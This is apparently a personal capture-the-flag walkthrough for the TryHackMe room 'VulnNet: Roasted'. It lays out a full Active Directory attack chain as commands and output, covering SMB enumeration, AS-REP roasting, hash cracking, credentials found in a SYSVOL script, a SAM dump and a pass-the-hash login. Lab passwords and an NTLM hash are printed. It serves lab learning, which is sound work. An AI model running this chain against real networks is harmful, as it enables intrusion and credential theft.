```http
https://tryhackme.com/room/vulnnetroasted
```

# Network scanning
```
nmap -p- -sC -sV -Pn 10.114.186.250 -v
```

> [!NOTE] Results
> Nmap scan report for 10.114.186.250
Host is up (0.081s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-08 16:38:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49794/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows


## other enum

```
nxc smb 10.114.186.250 
```


> [!NOTE] Results
>SMB         10.114.186.250  445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:None) (Null Auth:True)
## SMB

```
nxc smb 10.114.186.250 -u 'Guset' -p '' --shares
```

> [!NOTE] Results
> SMB         10.114.186.250  445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.114.186.250  445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\Guset: (Guest)
SMB         10.114.186.250  445    WIN-2BO8M1OE1M1  [*] Enumerated shares
SMB         10.114.186.250  445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.114.186.250  445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.114.186.250  445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.114.186.250  445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.114.186.250  445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.114.186.250  445    WIN-2BO8M1OE1M1  NETLOGON                        Logon server share 
SMB         10.114.186.250  445    WIN-2BO8M1OE1M1  SYSVOL                          Logon server share 
SMB         10.114.186.250  445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.114.186.250  445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing

```
smbclient //10.114.186.250/VulnNet-Business-Anonymous
```

> [!NOTE] Results
  Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021
  Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021
  Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021

```
smbclient //10.114.186.250/VulnNet-Enterprise-Anonymous
```


> [!NOTE] Results
>   Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021
  Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021
  Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021


```
mget * (full y)
```

```
Alexa Whitehat
Jack Goldenhand
Tony Skid
Johnny Leet
```

```
nxc smb 10.114.186.250 -u 'Guset' -p '' --rid-brute
```
Users:
```
VULNNET-RST\enterprise-core-vn 
VULNNET-RST\a-whitehat
VULNNET-RST\t-skid
VULNNET-RST\j-goldenhand
VULNNET-RST\j-leet
```

```
enterprise-core-vn 
a-whitehat
t-skid
j-goldenhand
j-leet
```


```
impacket-GetNPUsers -dc-ip 10.114.186.250 -usersfile users -format hashcat -outputfile asreproast_hashes.txt VULNNET-RST/''
```


> [!NOTE] Results
> Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST:e1f59152f06bee7c32151e43e26481d3$f44385d6efa8381000bb23000119751a99132f3bb5b2aab165ad6f4e47c6979a09a708cca01308b3839862c81ea975d8b6c14876fe61abb32655ee0e4c49ab6942dd8bc218ff8f621f7772ba4933008c402a48620bb27a70b73d6feb742572657b87fa5ea6b26df72654ecb496498813c2d5e8f18643c3724ebb2fb4a90b453fdb45e2f529570bcf3969bad1cd2ce5ec982a7618dfce06dd333bf4ea8f69360a8c6a509352f8acc5aa155c65e2d7623bd64458d1b7341c8e186a7da569c874b57585e96b555ded512897cb74ae1e086b338bbd9736323e123d38b1357bfd8d05d7055e03d16ef7cce1d67396f9ed12bf
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set


```
hashcat -m 18200 asreproast_hashes.txt /usr/share/wordlists/rockyou.txt 
```

```
t-skid / tj072889*
```

```
nxc ldap 10.114.186.250 -u 't-skid' -p 'tj072889*' --admin-count
```

```creds
a-whitehat - Admin
```

```
smbclient //10.114.186.250/SYSVOL -U 'vulnnet-rst/t-skid'
```

Found
```
\vulnnet-rst.local\scripts\ResetPassword.vbs
```

```creds
a-whitehat / bNdKVkjv3RR9ht
```

Dumplig local database 
```
nxc smb 10.114.186.250 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht' --sam
```

> [!NOTE] Results
> SMB         10.114.186.250  445    WIN-2BO8M1OE1M1  Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::


```
evil-winrm -i 10.114.186.250 -u "Administrator" -H 'c2597747aa5e43022a3a3049a3c3b09d'
```
